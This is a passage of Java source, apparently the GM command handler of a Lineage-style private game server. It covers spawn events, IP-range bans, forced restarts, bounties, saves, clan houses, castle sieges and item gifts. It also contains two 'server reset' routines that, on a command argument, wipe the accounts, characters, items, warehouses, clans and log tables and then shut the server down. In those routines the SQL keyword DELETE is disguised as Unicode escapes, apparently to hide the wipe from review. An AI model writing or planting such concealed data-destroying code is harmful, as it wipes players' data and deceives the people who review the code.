				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_matching_apclist", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_matching_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehousehistory", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM board_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);				
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);		
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);		
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				MJKDALoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}

private void \uC11C\uBC84\uCD08\uAE30\uD654(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) { 
					Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_resol", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_blocks", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_fairly_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_new_quest", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quest_monster", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_soldier", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_matching_apclist", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_matching_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehousehistory", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM board_item", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(3000);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);				
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);		
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_root", new Object[0]);		
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				MJKDALoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}
	private static void 물품2(L1PcInstance gm, String count) {
		ItemTradeTable.getInstance().buyTopic(gm, count, true);
	}

	private static void 물품3(L1PcInstance gm, String count) {
		ItemTradeTable.getInstance().cancelTopic(gm, count);
	}

	public static void autofish(L1PcInstance gm) {
		try {
			if (!gm.isFishing()) {
				gm.sendPackets( "\\fY낚시를 실행 후 가능합니다.");
				return;
			}
			for (L1PcInstance target : L1World.getInstance().getAllPlayers3()) {
				if (target.getId() != gm.getId() && target.getAccountName().toLowerCase().equals(gm.getAccountName().toLowerCase()) && target.isAutoFish()) {
					gm.sendPackets("\\f3귀하의 보조 캐릭터가 자동낚시 상태입니다.");
					return;
				}
			}
			
			CIOClient client = gm.getNetConnection();
			gm.setNetConnection(null);
			gm.setAutoFish(true);
			try {
				gm.save();
				gm.saveInventory();
			} catch (Exception e) {
			}
			client.setActiveChar(null);
			SC_Unknown2.send(client, 1); // 리스버튼을 위한 구조변경 // Episode U

		} catch (Exception e) {
		}
	}
	private void Event1(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String event = st.nextToken();

			if (event.equalsIgnoreCase("부대1")) {
				int rx = _random.nextInt(5);
				int ry = _random.nextInt(5);

				int rx1 = _random.nextInt(10);
				int ry1 = _random.nextInt(10);

				int rx2 = _random.nextInt(15);
				int ry2 = _random.nextInt(15);

				int ux = 32926 + rx;
				int uy = 33250 + ry;
				int um = 4;

				int ux1 = 32926 + rx1;
				int uy1 = 33250 + ry1;

				int ux2 = 32926 + rx2;
				int uy2 = 33250 + ry2;

				L1SpawnUtil.spawnfieldboss(ux, uy, (short) um, 45545, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux1, uy1, (short) um, 7000091, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 7000092, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 7000089, 0, 0, 0);
				System.out.println("▶소환이벤트 시작 : 첫번째 부대 출현◀");

				L1World.getInstance().broadcastServerMessage("\\aA소환이벤트: 잠시후 메티스의 근위부대가 출현 합니다.");

			} else if (event.equalsIgnoreCase("부대2")) {
				int rx = _random.nextInt(5);
				int ry = _random.nextInt(5);

				int rx1 = _random.nextInt(10);
				int ry1 = _random.nextInt(10);

				int rx2 = _random.nextInt(15);
				int ry2 = _random.nextInt(15);

				int ux = 32926 + rx;
				int uy = 33250 + ry;
				int um = 4;

				int ux1 = 32926 + rx1;
				int uy1 = 33250 + ry1;

				int ux2 = 32926 + rx2;
				int uy2 = 33250 + ry2;

				L1SpawnUtil.spawnfieldboss(ux, uy, (short) um, 45203, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux1, uy1, (short) um, 45206, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 45257, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 45263, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux1, uy1, (short) um, 45341, 0, 0, 0);
				System.out.println("▶소환이벤트 시작 : 두번째 부대 출현◀");

				L1World.getInstance().broadcastServerMessage("\\aA소환이벤트: 곧 이어 메티스의 근위부대가 출현 합니다.");

			} else if (event.equalsIgnoreCase("부대3")) {
				int rx = _random.nextInt(5);
				int ry = _random.nextInt(5);

				int rx1 = _random.nextInt(10);
				int ry1 = _random.nextInt(10);

				int rx2 = _random.nextInt(15);
				int ry2 = _random.nextInt(15);

				int ux = 32926 + rx;
				int uy = 33250 + ry;
				int um = 4;

				int ux1 = 32926 + rx1;
				int uy1 = 33250 + ry1;

				int ux2 = 32926 + rx2;
				int uy2 = 33250 + ry2;

				L1SpawnUtil.spawnfieldboss(ux, uy, (short) um, 707001, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux1, uy1, (short) um, 707002, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 707007, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 707008, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 707013, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 707015, 0, 0, 0);
				L1SpawnUtil.spawnfieldboss(ux2, uy2, (short) um, 707016, 0, 0, 0);
				System.out.println("▶소환이벤트 시작 : 세번째 부대 출현◀");

				L1World.getInstance().broadcastServerMessage("\\aA소환이벤트: 최종 메티스의 근위부대가 출현 합니다.");
			}
		} catch (Exception e) {
			gm.sendPackets("[.소환이벤트] [이벤트명]");
			gm.sendPackets("[소환이벤트명]: 부대1/부대2/ 부대3/부대4/부대5");
		}
	}

	private void LargeAreaIPBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);

			String charName = st.nextToken();
			String banIp = "";

			L1PcInstance player = L1World.getInstance().getPlayer(charName);

			if (player != null) {
				banIp = player.getNetConnection().getIp();

				String[] banIpArr = banIp.split("\\.");

				IpTable iptable = IpTable.getInstance();
				pc.sendPackets("----------------------------------------------------");
				Account.ban(player.getAccountName(), SC_LoginResult.BANNED_REASON_NOMANNER); // 계정을
																							// BAN시킨다.
				player.logout();
				player.getNetConnection().kick();
				for (int i = 1; i <= 255; i++) {
					iptable.banIp(banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + "." + i);
				}

				pc.sendPackets("IP: " + banIpArr[0] + "." + banIpArr[1] + "." + banIpArr[2] + ".1~255 광역 차단.");
				pc.sendPackets("----------------------------------------------------");
			}
		} catch (Exception e) {
			pc.sendPackets(".광역밴  [범위]");
		}
	}


	private void 강제리스(L1PcInstance pc, String cmd) {
		
		try {
			StringTokenizer tok = new StringTokenizer(cmd);
			String name = tok.nextToken();
			if (name == null || name.equals(""))
				throw new Exception();

			L1PcInstance target = L1World.getInstance().getPlayer(name);
			if (target == null) {
				pc.sendPackets(String.format("%s 님을 찾을 수 없습니다.", name));
				return;
			}
			
			CIOClient clnt = target.getNetConnection();
			clnt.kick();
			CS_CharSelect.restartProcess(target);
			Account acc		= clnt.getAccount();
			SC_CharAmount.send(clnt, acc.countCharacters(), acc.getCharSlot());
			if(acc.countCharacters() > 0)
				CS_CommonClick.sendCharPacks(clnt);
		
			
		} catch (Exception e) {
			pc.sendPackets(".강제리스 [캐릭터명])");
			
		}
		
		
		
	}
//	public void execute(L1PcInstance gm, String cmdName) {
//		운영자텔레포트(gm);
//	}
//	public static void 운영자텔레포트(L1PcInstance gm) {
//		ArrayList<String> result = new ArrayList<String>();
//		gm.sendPackets(new SC_NPCTalkReturn(gm.getId(), "GMt", (String[]) result.toArray(new String[result.size()])));
//	}
//	
	

	private void hunt(L1PcInstance pc, String cmd) {
		int price = Config.수배금액;
		try{
			StringTokenizer tok = new StringTokenizer(cmd);
			String name = tok.nextToken();
			if(name == null || name.equals("")) 
				throw new Exception();
			
			L1PcInstance target = L1World.getInstance().getPlayer(name);
			if(target == null){
				pc.sendPackets(String.format("%s 님을 찾을 수 없습니다.", name));
				return;
			}
			if(target.hasSkillEffect(L1SkillId.USER_WANTED) || target.hasSkillEffect(L1SkillId.USER_WANTED1)){
				pc.sendPackets(String.format("%s 님은 이미 수배중입니다.", name));
				return;
			}
			/*if(target.isGm()){
				pc.sendPackets("운영자에게 수배를 걸수없습니다.");
				return;
			}*/
			if (!(pc.getInventory().checkItem(40308, price))) {
				pc.sendPackets("아데나가 부족합니다");
				return;
			}
			
			String message = String.format("\\fY%s 님께서 %s님에게 수배를 걸었습니다.", pc.getName(), target.getName());
			String message1 = String.format("\\fY수배범을 잡을 시 확률적으로 수배범 2단으로 승급됩니다.");
			pc.sendPackets(message);
			target.sendPackets(message);
			target.sendPackets(message1);
			
			//target.sendPackets("\\fY수배효과: 추타+3,명중+3,AC-3,SP+3");
			//L1World.getInstance().broadcastPacketToAll(new SC_SystemMessage("\\fY["+target.getName()+"]님이 수배범이 되었습니다."));
			//L1World.getInstance().broadcastPacketToAll(new SC_SystemMessage("\\fY[수배자]: "+pc.getName()));
			
			
			target.setSkillEffect(L1SkillId.USER_WANTED, -1);
			target.doWanted(true);
			pc.getInventory().consumeItem(40308, price);
		}catch(Exception e){
			pc.sendPackets("\\fY.수배 [캐릭터명] ("+Config.수배금액 / 10000 +"만)");
			pc.sendPackets("\\fY수배효과: 추타+3,명중+3,AC-3,SP+3");
		}
	}

	private void serversave(L1PcInstance pc) {
		Saveserver();// 서버세이브 메소드 선언
		pc.sendPackets("서버저장이 완료되었습니다.");
	}

	/** 서버저장* */
	private void Saveserver() {
		/** 전체플레이어를 호출* */
		Collection<L1PcInstance> list = null;
		list = L1World.getInstance().getAllPlayers();
		for (L1PcInstance player : list) {
			if (player == null)
				continue;
			try {
				/** 피씨저장해주고* */
				player.save();
				/** 인벤도 저장하고* */
				player.saveInventory();

			} catch (Exception ex) {
				/** 예외 인벤저장* */
				player.saveInventory();
				System.out.println("저장 명령어 에러(인벤만 저장함): " + ex);
			}
		}
	}

	private void privateShop(L1PcInstance pc) {
		try {
			if (!pc.isPrivateShop()) {
				pc.sendPackets("개인상점 상태에서 사용이 가능합니다.");
				return;
			}

			CIOClient client = pc.getNetConnection();
			pc.setNetConnection(null);
			pc.set무인상점(true);
			try {
				pc.save();
				pc.saveInventory();
			} catch (Exception e) {
			}
			client.setActiveChar(null);
			SC_Unknown2.send(client, 1); // 리스버튼을 위한 구조변경 // Episode U

		} catch (Exception e) {
		}
	}

	private void GiveHouse(L1PcInstance gm, String poby) {
		   try {
			    StringTokenizer st = new StringTokenizer(poby);
			    String pobyname = st.nextToken();
			    int pobyhouseid = Integer.parseInt(st.nextToken());
			    L1PcInstance target = L1World.getInstance().getPlayer(pobyname);
			    if (target != null) {
			     if (target.getClanid() != 0) {
			      L1Clan TargetClan = L1World.getInstance().getClan(target.getClanid());
			      L1House pobyhouse = HouseTable.getInstance().getHouseTable(pobyhouseid);
			      if (pobyhouseid != 0 && pobyhouse == null) return;
                  final int expectedHouse = TargetClan.getHouseId();
                  try (l1j.server.server.model.L1InventoryTransaction tx =
                          l1j.server.server.model.L1InventoryTransaction.begin(gm,
                              l1j.server.server.model.L1AuctionTransaction.ORDER_KEY)) {
                      tx.requireTables("clan_data");
                      tx.sql(con -> {
                          try (java.sql.PreparedStatement ps = con.prepareStatement(
                                  "UPDATE clan_data SET hashouse=? WHERE clan_id=? AND hashouse=?")) {
                              ps.setInt(1,pobyhouseid);ps.setInt(2,TargetClan.getClanId());ps.setInt(3,expectedHouse);
                              if(ps.executeUpdate()!=1)throw new java.sql.SQLException("GM house assignment changed");
                          }
                      });
                      tx.commit(() -> {
                          TargetClan.setHouseId(pobyhouseid);
                          SC_SystemMessage.send(gm, target.getClanname()+" 혈맹의 아지트 변경을 저장했습니다.");
                      });
                  }

			     } else {
			      SC_SystemMessage.send(gm, target.getName()+"님은 혈맹에 속해 있지 않습니다.");
			     }
			    } else {
			     SC_ServerMessage.send(gm, 73, pobyname);
			    }
			   } catch (Exception e) {
			    SC_SystemMessage.send(gm, "\\fY.아지트 <지급할혈맹원> <아지트번호>");
			   }
			  }

	private void castleWarStart(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			int minute = Integer.parseInt(tok.nextToken());
			Calendar cal = RealTimeClock.getInstance().getRealTimeCalendar();
			if (minute != 0)
				cal.add(Calendar.MINUTE, minute);

			MJCastleWar war = MJCastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.nextCalendar(cal);
			MJCastleWarBusiness.getInstance().updateCastle(war.getCastleId());
			SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
			gm.sendPackets(String.format(".공성시간이 %s 으로 변경 되었습니다.", formatter.format(cal.getTime())));
			gm.sendPackets(param + "분 뒤 공성이 시작합니다.");
			formatter = null;
		} catch (Exception e) {
			gm.sendPackets(".공성시작 [성이름두글자] [분]");
		}
	}

	private void castleWarExit(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String name = tok.nextToken();
			MJCastleWar war = MJCastleWarBusiness.getInstance().findWar(name);
			if (war == null)
				throw new Exception();

			war.close();
		} catch (Exception e) {
			gm.sendPackets(".공성종료 [성이름두글자]");
		}
	}
	
	public void allitem(L1PcInstance gm, String arg) {
		
		
		
		for (L1PcInstance pc : L1World.getInstance().getVisiblePlayer(gm, 22)) {
			try {
				
				StringTokenizer st = new StringTokenizer(arg);
				
				String nameid = st.nextToken();
				
				int count = 1;
				if (st.hasMoreTokens()) {
					count = Integer.parseInt(st.nextToken());
				}
				int enchant = 0;
				if (st.hasMoreTokens()) {
					enchant = Integer.parseInt(st.nextToken());
				}
				int itemid = 0;
				int Attrenchant = 0;
				if (st.hasMoreTokens()) {
					Attrenchant = Integer.parseInt(st.nextToken());
				}
				
				try {
					itemid = Integer.parseInt(nameid);
				} catch (NumberFormatException e) {
					itemid = ItemTable.getInstance().findItemIdByNameWithoutSpace(nameid);
					if (itemid == 0) {
						SC_SystemMessage.send(pc, "해당 아이템이 발견되지 않았습니다.");
						return;
					}
				}
				L1Item temp = ItemTable.getInstance().getTemplate(itemid);
				if (temp != null) {
					if (temp.isStackable()) {
						L1ItemInstance item = ItemTable.getInstance().createItem(itemid);
						item.setEnchantLevel(0);
						item.setCount(count);
						if (pc.getInventory().checkAddItem(item, count) == L1Inventory.OK) {
							pc.getInventory().storeItem(item);
							//pc.sendPackets(new S_GMHtml("선물: "+pc.getName()+"" , ""+item.getLogName()+" 를(을) 획득함 인벤토리 확인."));
							//pc.sendPackets("선물: " + item.getLogName() + " " + count + "개 획득 인벤토리 확인하세요");
							
							SC_SkillSound.send(pc, pc.getId(), 4856);
							SC_SystemMessage.send(pc, "\\aD[특별선물]  " + item.getLogName() + " (" + count + "개) 획득");
							SC_SystemMessage.send(gm, "\\aD화면 내 유저들에게 +" + enchant + " "+ temp.getNameId()+"(ID:" + itemid + ") "+ count +"개 보냄", true);
							SC_PacketBox.broadcastGreen("\\f=운영자 주위 유저분들에게 선물을 드렸습니다 ▶▶ "+ temp.getNameId()+"("+count+")");
						}
					} else {
						L1ItemInstance item = null;
						int createCount;
						for (createCount = 0; createCount < count; createCount++) {
							item = ItemTable.getInstance().createItem(itemid);
							item.setEnchantLevel(enchant);
							item.setAttrEnchantLevel(Attrenchant);
							
							//if (target.getInventory().checkAddItem(item, 1) == L1Inventory.OK) {
							pc.getInventory().storeItem(item);
							
							//	} else {
							//		break;
							//	}
						}
						if (createCount > 0) {
							//pc.sendPackets(new S_GMHtml("선물:"+pc.getName()+"" , ""+item.getLogName()+"("+count+") 를(을) 획득함.　인벤토리 확인하세요"));
							SC_SkillSound.send(pc, pc.getId(), 4856);
							SC_SystemMessage.send(pc, "\\aD[특별선물]  " + item.getLogName() + " (" + count + "개) 획득");
